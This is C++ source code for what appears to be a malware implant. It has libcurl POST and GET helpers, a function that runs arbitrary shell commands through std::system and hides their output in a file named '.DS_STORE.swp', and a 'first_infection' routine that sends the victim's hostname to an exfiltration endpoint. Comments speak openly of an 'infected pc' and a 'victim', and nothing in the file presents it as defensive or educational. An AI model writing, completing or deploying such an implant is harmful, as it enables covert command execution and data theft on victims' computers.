#include "request.h"
size_t CurlcallbackFuncToString(void *contents, size_t size, size_t nmemb, std::string *s)
{
    size_t newLength = size*nmemb;
    try
    {
        s->append((char*)contents, newLength);
    }
    catch(std::bad_alloc &e)
    {
        //handle memory problem on infected pc.... or just don't?
        return 0;
    }
    return newLength;
}

void curl_post(std::string url, std::string endpoint, std::string data) {
    CURL *curl;
    CURLcode res;
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, (url + endpoint).c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

std::string curl_get(std::string url, std::string endpoint) {
    CURL *curl;
    CURLcode res;
    std::string response;
    curl = curl_easy_init();
    if(curl) {
      curl_easy_setopt(curl, CURLOPT_URL, (url + endpoint).c_str());
      curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlcallbackFuncToString);
      curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

     
      /* use a GET to fetch this */
      curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
     
      /* Perform the request */
      res = curl_easy_perform(curl); 
      curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
    return response;
}

/* This is so fucking ghetto holy shit
 * 
 */
std::vector<std::string> command(std::string toRun) {
    //Build and run command
    std::string cmd = " " + toRun + " > .DS_STORE.swp";
    std::system(cmd.c_str());

    //Storage
    std::vector<std::string> ret;
    std::string line;
    std::ifstream fin(".DS_STORE.swp");
    
    while (std::getline(fin, line)) {
        ret.push_back(line);
    }
    return ret;

}

//Run when the victim is first infected
void first_infection() {
    std::vector<std::string> val = command("hostname");
    for(std::vector<std::string>::iterator it = val.begin(); it != val.end(); ++it) {
        curl_post(URL, EXFIL, *it);
    }
}



